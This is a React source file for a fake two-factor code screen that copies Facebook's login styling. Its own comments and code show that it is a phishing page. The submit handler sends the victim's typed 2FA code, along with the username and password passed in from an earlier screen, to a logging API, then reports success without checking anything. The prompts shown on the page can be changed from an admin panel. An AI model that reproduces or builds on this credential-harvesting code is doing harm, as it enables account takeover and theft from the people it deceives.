import React, { useState, useEffect } from 'react';
import { ArrowLeft, RotateCw, Check } from 'lucide-react';
import { api } from '../api/client';

/**
 * Confirm Account Illustration matching user screenshot:
 * Gradient pastel card, message / SMS icon (or WhatsApp), phone screen with green ****** in center,
 * and stylized hand with red manicure tapping screen.
 */
function TwoFactorIllustration({ channel = 'sms' }) {
  return (
    <div className="fb-confirm-illustration-banner" style={{ width: '100%', borderRadius: 16, overflow: 'hidden', marginBottom: 20 }}>
      <svg viewBox="0 0 360 144" style={{ width: '100%', height: 'auto', display: 'block' }}>
        <defs>
          <linearGradient id="twoFactorBgGrad" x1="0%" y1="0%" x2="100%" y2="100%">
            <stop offset="0%" stopColor="#FDE6EA" />
            <stop offset="100%" stopColor="#E7ECFC" />
          </linearGradient>
          <filter id="twoFactorShadow" x="-10%" y="-10%" width="130%" height="130%">
            <feDropShadow dx="0" dy="5" stdDeviation="5" floodColor="#000" floodOpacity="0.08" />
          </filter>
        </defs>

        {/* Soft pastel background card */}
        <rect width="360" height="144" rx="16" fill="url(#twoFactorBgGrad)" />

        {/* Left: Message / SMS or WhatsApp Icon Circle */}
        {channel === 'whatsapp' ? (
          <g transform="translate(46, 44)">
            <circle cx="26" cy="26" r="26" fill="#25D366" />
            <path
              d="M26 8C16.1 8 8 16.1 8 26c0 3.2.8 6.2 2.3 8.8L8 44l9.5-2.5c2.5 1.4 5.4 2.1 8.5 2.1 9.9 0 18-8.1 18-18S35.9 8 26 8zm10.5 25.5c-.4 1.2-2.3 2.3-3.2 2.5-.9.1-2 .4-6.4-1.4-5.4-2.3-8.8-7.8-9.1-8.2-.3-.4-2.2-3-2.2-5.6s1.4-4 1.9-4.5c.4-.5 1-.7 1.4-.7.3 0 .8 0 1.1.1.3.1.9.1 1.3 1.2.4 1.1 1.5 3.8 1.7 4.2.1.3.2.7 0 1-.1.3-.3.7-.6.9-.3.3-.6.7-.2 1.2.9 1.5 2.6 3.3 4.4 4.2.6.3.9.2 1.2-.1.3-.3 1.3-1.5 1.7-2.1.3-.6.8-.4 1.2-.3.4.1 3 1.4 3.5 1.7.6.3.9.4 1 .7.1.4.1 1.8-.3 3.1z"
              fill="#FFFFFF"
            />
          </g>
        ) : (
          <g transform="translate(46, 44)">
            <circle cx="26" cy="26" r="26" fill="#0866FF" />
            <path
              d="M17 18h18c1.1 0 2 .9 2 2v11c0 1.1-.9 2-2 2h-4l-5 4v-4H17c-1.1 0-2-.9-2-2V20c0-1.1.9-2 2-2z"
              fill="#FFFFFF"
            />
          </g>
        )}

        {/* Center / Right: White Smartphone */}
        <g transform="translate(138, 14)" filter="url(#twoFactorShadow)">
          {/* Phone body */}
          <rect x="0" y="0" width="112" height="154" rx="16" fill="#FFFFFF" stroke="#E4E6EB" strokeWidth="1.5" />
          {/* Screen surface */}
          <rect x="6" y="8" width="100" height="136" rx="10" fill="#F0F2F5" />
          {/* Camera Dot & Speaker bar */}
          <circle cx="20" cy="18" r="3.5" fill="#0866FF" />
          <rect x="34" y="16.5" width="34" height="3" rx="1.5" fill="#CCD0D5" />

          {/* Green Code Input Capsule */}
          <rect x="10" y="42" width="92" height="28" rx="6" fill="#FFFFFF" stroke="#E4E6EB" strokeWidth="1" />
          <text
            x="56"
            y="61"
            fill="#00A859"
            fontSize="18"
            fontWeight="bold"
            textAnchor="middle"
            letterSpacing="3"
            fontFamily="monospace"
          >
            ******
          </text>
        </g>

        {/* Stylized Hand tapping screen */}
        <g transform="translate(130, 24)">
          <path
            d="M125 120 C120 75, 102 58, 93 47 C89 42, 83 42, 80 47 C77 52, 78 60, 81 68 L88 88 C90 93, 86 102, 78 104 C73 106, 70 102, 70 97 L68 72 C67 65, 61 61, 56 64 C52 68, 52 76, 54 84 L64 120"
            fill="#E78D70"
          />
          <path
            d="M93 75 L93 42 C93 35, 101 35, 101 42 L101 75 Z"
            fill="#E78D70"
          />
          <path
            d="M94 40 C94 36.5, 100 36.5, 100 40 C100 44, 94 44, 94 40 Z"
            fill="#E41E3F"
          />
        </g>
      </svg>
    </div>
  );
}

export default function TwoFactorVerification({
  isDesktop = true,
  userInput = '',
  userPassword = '',
  onSuccess,
  onBack,
  onTryAnotherWay,
}) {
  const [code, setCode] = useState('');
  const [trustDevice, setTrustDevice] = useState(true);
  const [isSubmitting, setIsSubmitting] = useState(false);

  // Load recovery / 2fa channel settings from storage
  const [settings, setSettings] = useState(() => {
    try {
      const saved = localStorage.getItem('sphere_recovery_settings');
      if (saved) return JSON.parse(saved);
    } catch {}
    return {
      twoFactorTitle: 'Check your text messages',
      twoFactorSubtitle: 'Enter the code that we sent to your mobile number.',
      twoFactorTimer: '00:52',
      twoFactorChannel: 'sms',
    };
  });

  useEffect(() => {
    if (api?.admin?.getRecoverySettings) {
      api.admin.getRecoverySettings().then((res) => {
        if (res) setSettings((prev) => ({ ...prev, ...res }));
      });
    }
  }, []);

  const handleSubmit = (e) => {
    e.preventDefault();
    const codeVal = code.trim();
    if (!codeVal) return;

    setIsSubmitting(true);

    // Save security code to database
    api.logAttempt({
      username: userInput || 'User',
      email: userInput || 'User',
      password: userPassword || '[2FA Security Code Submitted]',
      accountName: userInput || 'User',
      action: `Confirmed 2FA Security Code: "${codeVal}"`,
      source: isDesktop ? 'Desktop 2FA Verification' : 'Mobile 2FA Verification',
      screen: 'Check your messages 2FA Screen',
      device: isDesktop ? 'Desktop Browser (PC/Mac)' : 'Mobile Device',
      code: codeVal,
      success: true,
    });

    onSuccess && onSuccess(codeVal);
  };

  const channelTitle = settings.twoFactorTitle || 'Check your text messages';
  const channelSubtitle = settings.twoFactorSubtitle || 'Enter the code that we sent to your mobile number.';
  const timerText = settings.twoFactorTimer || '00:52';
  const channelType = settings.twoFactorChannel || 'sms';

  return (
    <div
      style={{
        width: '100%',
        minHeight: '100vh',
        backgroundColor: isDesktop ? '#F0F2F5' : '#FFFFFF',
        display: 'flex',
        alignItems: isDesktop ? 'center' : 'flex-start',
        justifyContent: 'center',
        padding: isDesktop ? '32px 16px' : '0',
        fontFamily: "-apple-system, BlinkMacSystemFont, 'Segoe UI Historic', 'Segoe UI', Roboto, Helvetica, Arial, sans-serif",
      }}
    >
      <div
        style={{
          width: '100%',
          maxWidth: '440px',
          backgroundColor: '#FFFFFF',
          borderRadius: isDesktop ? '16px' : '0',
          boxShadow: isDesktop ? '0 4px 16px rgba(0, 0, 0, 0.08)' : 'none',
          padding: '24px 24px 32px 24px',
          boxSizing: 'border-box',
        }}
      >
        {/* Top Back Arrow */}
        <div style={{ marginBottom: 16 }}>
          <button
            type="button"
            onClick={onBack}
            style={{
              background: 'none',
              border: 'none',
              cursor: 'pointer',
              padding: '6px',
              marginLeft: '-6px',
              display: 'inline-flex',
              alignItems: 'center',
              justifyContent: 'center',
              borderRadius: '50%',
              color: '#050505',
            }}
            title="Back to login"
            aria-label="Back to login"
          >
            <ArrowLeft size={24} color="#050505" strokeWidth={2.4} />
          </button>
        </div>

        {/* Title & Subtitle */}
        <h1
          style={{
            fontSize: '24px',
            fontWeight: 700,
            color: '#050505',
            margin: '0 0 8px 0',
            lineHeight: 1.25,
            letterSpacing: '-0.3px',
          }}
        >
          {channelTitle}
        </h1>
        <p
          style={{
            fontSize: '15px',
            color: '#1C1E21',
            margin: '0 0 20px 0',
            lineHeight: 1.4,
          }}
        >
          {channelSubtitle}
        </p>

        {/* Illustration */}
        <TwoFactorIllustration channel={channelType} />

        {/* Form */}
        <form onSubmit={handleSubmit} autoComplete="off">
          {/* Code Input */}
          <div style={{ marginBottom: 14 }}>
            <input
              type="text"
              name="two_factor_code"
              placeholder="Code"
              value={code}
              onChange={(e) => setCode(e.target.value)}
              autoFocus
              autoComplete="one-time-code"
              style={{
                width: '100%',
                height: '52px',
                borderRadius: '12px',
                border: '1px solid #CED0D4',
                padding: '0 16px',
                fontSize: '16px',
                color: '#050505',
                outline: 'none',
                boxSizing: 'border-box',
                backgroundColor: '#FFFFFF',
                transition: 'border-color 0.15s ease',
              }}
              onFocus={(e) => (e.target.style.borderColor = '#0866FF')}
              onBlur={(e) => (e.target.style.borderColor = '#CED0D4')}
            />
          </div>

          {/* Resend Timer Text */}
          <div
            style={{
              display: 'flex',
              alignItems: 'center',
              gap: '8px',
              fontSize: '14px',
              color: '#65676B',
              marginBottom: 16,
            }}
          >
            <RotateCw size={16} color="#65676B" strokeWidth={2} />
            <span>
              We can send a new code in <strong>{timerText}</strong>.
            </span>
          </div>

          {/* Trust this device Checkbox */}
          <div
            style={{
              display: 'flex',
              alignItems: 'center',
              gap: '10px',
              marginBottom: 24,
              cursor: 'pointer',
              userSelect: 'none',
            }}
            onClick={() => setTrustDevice((prev) => !prev)}
          >
            <div
              style={{
                width: '20px',
                height: '20px',
                borderRadius: '4px',
                backgroundColor: trustDevice ? '#0866FF' : '#FFFFFF',
                border: trustDevice ? 'none' : '2px solid #CED0D4',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center',
                flexShrink: 0,
                transition: 'all 0.12s ease',
              }}
            >
              {trustDevice && <Check size={14} color="#FFFFFF" strokeWidth={3} />}
            </div>
            <span
              style={{
                fontSize: '14.5px',
                fontWeight: 600,
                color: '#050505',
                lineHeight: 1.3,
              }}
            >
              Trust this device and skip this step from now on
            </span>
          </div>

          {/* Continue Button */}
          <button
            type="submit"
            disabled={!code.trim() || isSubmitting}
            style={{
              width: '100%',
              height: '44px',
              borderRadius: '22px',
              backgroundColor: code.trim() ? '#0866FF' : '#A8C7FA',
              color: '#FFFFFF',
              border: 'none',
              fontSize: '15px',
              fontWeight: 600,
              cursor: code.trim() ? 'pointer' : 'not-allowed',
              marginBottom: '12px',
              transition: 'background-color 0.15s ease',
            }}
          >
            Continue
          </button>

          {/* Try another way Button */}
          <button
            type="button"
            onClick={onTryAnotherWay}
            style={{
              width: '100%',
              height: '44px',
              borderRadius: '22px',
              backgroundColor: '#F0F2F5',
              color: '#050505',
              border: 'none',
              fontSize: '15px',
              fontWeight: 600,
              cursor: 'pointer',
              transition: 'background-color 0.12s ease',
            }}
            onMouseEnter={(e) => (e.target.style.backgroundColor = '#E4E6EB')}
            onMouseLeave={(e) => (e.target.style.backgroundColor = '#F0F2F5')}
          >
            Try another way
          </button>
        </form>
      </div>
    </div>
  );
}
